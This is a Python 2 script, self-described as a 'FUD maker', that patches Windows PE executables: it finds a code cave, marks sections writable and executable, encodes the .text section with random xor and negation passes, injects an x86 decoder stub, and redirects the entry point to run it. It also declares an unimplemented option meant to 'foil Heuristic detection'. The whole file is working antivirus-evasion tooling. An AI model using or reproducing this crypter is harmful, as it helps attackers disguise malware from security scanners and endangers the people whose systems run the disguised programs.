import sys
import pefile
import struct
from capstone import *
import argparse
import random
from ctypes import c_uint32


pe = None
VALIDITY_THRESHOLD = 0x100
TEXT_ADDR_START = 0x0
TEXT_ADDR_END = 0xffffffff

#Opcodes for readability

#Start defining the decoding operations 
jmp = "\xe9%s"  # + relative offset
pushad = "\x60"
popad = "\x61"
#################3
clear_eax = "\x33\xc0"
clear_ebx = "\x33\xdb"
##################3
mov_eax = "\xc7\xc0%s"
mov_ebx = "\xc7\xc3%s"
##################3
cmp_eax_int = "\x81\xf8%s" 
cmp_eax_ebx = "\x3b\x3c"
##################
jne_byte = "\x75%c"
################
inc_eax = "\x40"

def main(args):
    global pe
    global TEXT_ADDR_START
    global TEXT_ADDR_END

    decode_ops = { "add" : add_byte,
                   "sub" : sub_byte,
                   "xor" : xor_byte,
                   "neg" : neg_dword,
    }

    encode_ops = { "add" : enc_sub,
                   "sub" : enc_add,
                   "xor" : enc_xor,
                   "neg" : enc_neg,
    }


  
    potential_caves = []
    valid_loc = []
    section_index = 0
    
    try:
        pe = pefile.PE(args.pe)
    except:
        print "[x.x] Invalid PE, dumbface."
        sys.exit()
    
    entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
   
#grab the biggest chunk of consecutive "\x00" from each section 
    for i in pe.sections:
        addr,length = find_cave(i) 
        potential_caves.append((i.Name,addr,length,section_index)) 
        section_index+=1
        if ".text" in i.Name:
            TEXT_ADDR_START = i.VirtualAddress
            TEXT_ADDR_END = TEXT_ADDR_START + i.SizeOfRawData
        
#only bother with sections that have "\x00*x" with x > threshold 
    print "Jump Canidates with >= %d space" % VALIDITY_THRESHOLD 
    for i in range(0,len(potential_caves)):
        canidate = potential_caves[i]  
        if canidate[2] >= VALIDITY_THRESHOLD:     #lenght of cave
            valid_loc.append(canidate)
            print "%d) %s: ADDR:0x%08x  LEN:0x%08x" % (len(valid_loc),canidate[0],canidate[1],canidate[2])
    loc_choice = int(raw_input("[?.?] Which location would you like to use? "))
       
#use user specified
    if loc_choice in range(1,len(valid_loc)+1):
        print "[^.^] Using option %d" % (loc_choice,) 
        
    else:
        print "[x.x] Invalid choice, dumbface."
        sys.exit()

#modify entry to jump to selected section, return saved bytes
    loc_choice = valid_loc[loc_choice-1] 
   
    print loc_choice
    final_ret, saved_entry = save_entry_point(entry_point,loc_choice[1])

    #change section to read/write/exec if needed
    # 0x10000000 => Sharable
    # 0x20000000 => Executable
    # 0x40000000 => Readable
    # 0x80000000 => Writable
    # make sure our code cave is RWX
    ensure_perms(loc_choice[3],0xE0000000)
    
    # make sure every other section is RW (if doing full encoding) 
    for s in pe.sections:
        ensure_perms(s,0xC0000000) 

    #for Readability
    sec_name,sec_addr,sec_len,sec_index = loc_choice
     

    #for each encoding operation, the code lenght does not change
    # so we can probably just maintain a counter to for how many
    # bytes have been written inside of the code_location.
    # Start generating the encoding list
    bytes_generated = 0
    iterations = 0
    op_choice = list(decode_ops)

    random.seed()
    random.shuffle(op_choice)
   
    op_list = [] 
    amt_list = []
    decode_text= []
    
   
    #generate the operations/keep track of length, no writing to exe yet 
    while bytes_generated < (sec_len -len(saved_entry)):  
       #in case we don't want to fill the entire location
        
        if args.max_encodes:
            if iterations >= args.max_encodes:
                break 
        
        amt_list.append(random.randint(1,254))
        operation = random.choice(list(encode_ops)) 
        if operation == "add" or operation == "sub":
            operation = "xor"

        op_list.append(operation)
         
        base= pe.OPTIONAL_HEADER.ImageBase

        if operation != "neg":
            decode_text.append(decode_operation(TEXT_ADDR_START+base,TEXT_ADDR_END+base,decode_ops[operation],"eax",amt_list[-1])) 
        else: 
            decode_text.append(decode_operation(TEXT_ADDR_START+base,TEXT_ADDR_END+base,decode_ops[operation],"neg",amt_list[-1])) 
        
        if len(decode_text[-1]) + bytes_generated > (sec_len - len(saved_entry)):    
            #if we added one more encode, we'd go past the cave
            op_list = op_list[:-1]
            decode_text = decode_text[:-1]
            break

        bytes_generated+=len(decode_text[-1])
        iterations+=1


    bytes_written = 0
    for x in range(0,len(decode_text)): 
        inv = len(decode_text)-(x+1)

        print "Encoding text: %s,%02x" % (op_list[x],amt_list[x])
        print "0x%08x| %s | Value: 0x%02x" % (sec_addr+bytes_written+base,op_list[inv], amt_list[inv]) 
        text = pe.get_data(TEXT_ADDR_START,TEXT_ADDR_END)
                  
        encoded_text = encode_ops[op_list[x]](text,amt_list[x])
    
        
        pe.set_bytes_at_rva(TEXT_ADDR_START,encoded_text)
        pe.set_bytes_at_rva(sec_addr+bytes_written,decode_text[inv])

        bytes_written+=len(decode_text[inv])

        
    #now that binary has been encoded, and the decoder written, we have to change the execution path
    print "Final ret: 0x%08x, saved entry: %s" % (final_ret, saved_entry.encode("HEX"))
    print "[*.*] Writing hop to decoder chain"
    jmpaddr = struct.pack("<I",sec_addr-final_ret)
    print "[>.>] Jmp dst: 0x%08x" % sec_addr
    pe.set_bytes_at_rva(entry_point,pushad)
    pe.set_bytes_at_rva(entry_point+1,(jmp%jmpaddr)) 
    
    #write the saved_entry back
    pe.set_bytes_at_rva(sec_addr+bytes_written,popad)
    pe.set_bytes_at_rva(sec_addr+bytes_written+1,saved_entry) 
    bytes_written+=len(saved_entry)
    #calc/write the jump back to entry+len(saved_entry) (5 is from len(jmp rel)+ 2 for pushad/popad)
    dst = 0xffffffff - ((sec_addr + bytes_written + len(saved_entry) - 7) - entry_point) + 1
    jmpaddr = struct.pack("<I",dst)
    pe.set_bytes_at_rva(sec_addr+bytes_written,jmp%jmpaddr)


    pe.write(args.output)



'''
int section : index of section to be checked
    or
PeSection section: actual section to be checked

int perms   : section permissions to be ensured

'''
def ensure_perms(section,perms):
    try:
        sec = pe.sections[section]
    except TypeError:
        sec = section
        
    sec.Characteristics |= perms 
    

def save_entry_point(entry_point,loc_choice_addr): 
    ins_size = 0
    #save old entry bytes
    print "Entry Point: 0x%08x " % entry_point
    saved_entry_point = pe.get_data(entry_point,0x16) #0x5 = len of jmp long

    
    #verify that the first 6 bytes do not overun partially into an instruction
    # 6 bytes = push ad#jmp rel 
    md = Cs(CS_ARCH_X86,CS_MODE_32)
    for instr in md.disasm(saved_entry_point,0):
        ins_size+=instr.size
        if ins_size == 6: #good, hit the end of an instr
            saved_entry_point = saved_entry_point[0:6]
            break 
        elif ins_size > 6: #landed in middle of instr, must save more bytes
            saved_entry_point = saved_entry_point[0:ins_size]
            break 
    print "[!.!] Saving first %d bytes" % len(saved_entry_point)


    #calulate offset to reach code cave
    offset = loc_choice_addr-entry_point-3
    offset = struct.pack("<I",offset)
    print "Saving bytes: %s" % repr(saved_entry_point)
    
    #where we jump to after decoding
    ret_addr = entry_point + len(saved_entry_point)
    
    return (ret_addr,saved_entry_point)


def find_cave(section):
    addr = 0
    max_size = 0
    tmp = 0

    section_data = pe.get_data(section.VirtualAddress,section.SizeOfRawData)

    
    for x in range(len(section_data)):
        if not ord(section_data[x]):
            tmp+=1
        else:
            if tmp > max_size:
                max_size = tmp
                addr = (section.VirtualAddress + x) - max_size
            tmp=0
    if tmp > max_size:
            max_size = tmp
            addr = (section.VirtualAddress + x) - max_size

    return addr,max_size



# upperbound = top of decode gadget 
# lowerbound = bottom of decode gadget
# operation_tup = operation to perform decoding/value
# only eax included right now
# i.e. ("add","eax",5), ("sub","eax"10)

def decode_operation(upperbound,lowerbound,op,reg,amt):

    payload = ""
    payload += mov_eax % struct.pack("<I",upperbound) 
    jmpdst = len(payload)
    if reg != "neg":
        payload += inc_eax
    # i.e. ("add",5) => add_byte(5)
    payload += op(reg,amt) 
    payload += cmp_eax_int % struct.pack("I",lowerbound) 
    payload += jne_byte % (0xff-(len(payload)-jmpdst)-1)
    return payload 
     

#Assembly operations to decode the binary

# add byte ptr DS:[eax],0x12
def add_byte(register,value):
    add_byte_eax = "\x80\x00%c"
    return add_byte_eax % chr(value)  

# sub byte ptr DS:[eax],0x12
def sub_byte(register,value):
    sub_byte_eax = "\x80\x28%c"
    return sub_byte_eax % chr(value)

# xor byte ptr DS:[eax],0x12
def xor_byte(register,value):
    xor_byte_eax = "\x80\x30%c"
    return xor_byte_eax % chr(value)

def neg_dword(register,value):
    # mov ebx, dword ptr DS:[eax]
    # neg ebx
    # mov dword ptr DS:[eax], ebx
    # inc eax * 4 
    negate_word = "\x8b\x18\xf7\xdb\x89\x18\x40\x40\x40\x40"
    return negate_word


#Python operations to encode the binary
def enc_add(section,val):
    buf = ""
    for b in section:
        if ord(b)+ val > 255:
            buf+=chr((ord(b)+val-1) % 255)  
        else:
            buf+=chr((ord(b)+val) % 255)  

    return buf

def enc_sub(section,val):
    buf = ""
    
    for b in section:
        buf+=chr((ord(b)-val) % 255) 
    return buf

def enc_xor(section,val):
    buf = ""
    for b in section:
        buf+=chr(ord(b)^val) 
    return buf

def enc_neg(section,val=0):
    buf = ""
    
    for b in range(0,len(section),4):
        a = section[b:b+4]
        val = struct.unpack("I",section[b:b+4])[0]
        negation = c_uint32(~val+1) 
        buf+=struct.pack("I",negation.value) 
    return buf

# ideally ("nop",1000000) 
# ("add_sub_eax" , 1230147)
def heuristics_delay(delay_tup):
    pass



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = 'fudfun.py - the hopefully fud maker <(^.^)>') 
    parser.add_argument("pe", help="PE to Fud")
    parser.add_argument("-m","--max_encodes",help="Try creating up to <max> different encodes",type=int)
    parser.add_argument("-H","--Heuristic",help="Add delays to try to foil Heuristic detection",action="store_true")
    parser.add_argument("-a","--all_sections",help="Try encoding all sections,normally just .text")
    parser.add_argument("-o","--output",help="Output binary name",default="test_fud.exe")
    
    args = parser.parse_args()
    
    main(args)
